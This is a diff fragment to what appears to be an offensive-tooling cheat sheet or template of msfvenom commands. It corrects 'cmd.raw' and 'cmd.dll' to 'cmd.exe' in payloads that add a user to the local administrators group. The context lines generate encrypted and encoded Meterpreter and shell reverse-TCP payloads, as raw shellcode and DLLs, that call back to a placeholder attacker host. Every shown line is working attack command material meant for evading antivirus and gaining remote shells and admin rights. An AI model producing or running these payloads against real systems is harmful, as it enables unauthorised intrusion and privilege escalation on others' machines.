@@ -1536,9 +1536,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -e x86/s
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
 
-msfvenom -p windows/exec CMD='cmd.raw /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
+msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
 
-msfvenom -p windows/x64/exec CMD='cmd.raw /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
 
@@ -1564,9 +1564,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -e x86/s
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
-msfvenom -p windows/exec CMD='cmd.dll /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
-msfvenom -p windows/x64/exec CMD='cmd.dll /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
 
